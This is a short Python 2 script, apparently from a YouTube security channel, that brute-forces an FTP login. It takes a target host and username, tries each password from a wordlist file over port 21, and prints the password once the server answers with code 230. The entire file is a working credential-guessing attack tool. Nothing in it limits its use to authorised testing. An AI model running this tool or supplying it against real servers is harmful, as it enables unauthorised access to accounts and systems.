#!/usr/bin/python
import socket
import re
import sys
print "    _________   ____________  ____________________  __"
print "   / ____/   | / ____/  _/ / /_  __/ ____/ ____/ / / /"
print "  / /_  / /| |/ /    / // /   / / / __/ / /   / /_/ / "
print " / __/ / ___ / /____/ // /___/ / / /___/ /___/ __  /  "
print "/_/   /_/  |_\____/___/_____/_/ /_____/\____/_/ /_/   "
print "                                                      "
print " Autor: Eduardo Amaral ";
print " Youtube: youtube.com/faciltech"
if len(sys.argv) < 3:
	print "Use python findFTP.py 127.0.0.1 usuario"
	sys.exit(0)

usuario = sys.argv[2]

file = open("common.txt")
for linha in file.readlines():
	print "Testando com %s:%s "%(usuario,linha)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect_ex((sys.argv[1],21))
	s.recv(1024)
	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+linha+"\r\n")
	resultado = s.recv(1024)
	s.send("QUIT\r\n")
	
	if re.search("230",resultado):
		print "[+] ====> SENHA ENCONTRADA <===== %s [+]"%(linha)
		break
	else:
		print "[-] Acesso Negado [-]\n"
